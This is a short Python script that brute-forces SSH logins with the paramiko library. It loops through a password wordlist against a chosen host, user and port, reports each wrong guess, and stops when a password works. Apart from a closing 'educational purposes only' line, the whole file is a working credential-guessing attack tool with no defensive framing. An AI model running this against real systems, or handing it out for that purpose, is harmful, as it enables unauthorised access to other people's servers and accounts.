import paramiko
import socket
from time import sleep

# Define colors for output
W = '\033[0m'  # white (normal)
R = '\033[31m'  # red
G = '\033[32m'  # green
O = '\033[33m'  # orange
B = '\033[34m'  # blue
P = '\033[35m'  # purple
C = '\033[36m'  # cyan
GR = '\033[37m'  # gray

def ssh_connect(address, username, password, port):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    paramiko.util.log_to_file("filename.log")

    try:
        ssh.connect(address, port=port, username=username, password=password)
        ssh.close()
        return 0  # Successful connection
    except paramiko.AuthenticationException:
        return 1  # Authentication failed
    except socket.error:
        print(f"{R}[!] Error: Connection Failed. [!]{W}")
        return 2  # Connection error

def ssh_bruteforce(address, username, wordlist, port, delay):
    with open(wordlist, 'r') as wl:
        for line in wl:
            password = line.strip()
            try:
                response = ssh_connect(address, username, password, port)
                if response == 0:
                    print(f"{G}[*] Username: {username} | [*] Password found: {password}\n{W}")
                    break  # Exit loop after finding the correct password
                elif response == 1:
                    print(f"{O}[*] Username: {username} | [*] Password: {password} | Incorrect!{W}")
                    sleep(delay)
                elif response == 2:
                    print(f"{R}[!] Error: Connection couldn't be established to address. Check if host is correct, or up! [!]{W}")
                    exit()
            except Exception as e:
                print(f"{R}[!] An unexpected error occurred: {e}{W}")

# Note: This script is for educational purposes only.
